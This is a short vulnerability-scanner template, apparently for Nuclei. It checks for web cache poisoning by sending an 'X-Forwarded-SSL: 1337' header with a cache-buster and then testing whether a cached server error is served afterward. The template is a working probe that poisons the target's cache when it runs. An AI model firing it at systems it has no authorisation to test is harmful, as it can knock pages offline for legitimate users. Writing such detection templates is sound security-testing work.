id: forward-ssl-cache-posioning

info:
  name: Forwarded ssl - Cache Posioning
  author: omkar7505
  severity: high
  description: |
    Forwarded ssl - Cache Posioning
  tags: omkar7505,cache

variables:
  rand: "{{rand_text_numeric(5)}}"
  
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /?cb={{rand}} HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-SSL: 1337

      - |
        GET /?cb={{rand}} HTTP/1.1
        Host: {{Hostname}}

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 >= 200 && status_code_1 < 500"
          - "status_code_2 >= 500"
          - "status_code_3 >= 500" 
        condition: and
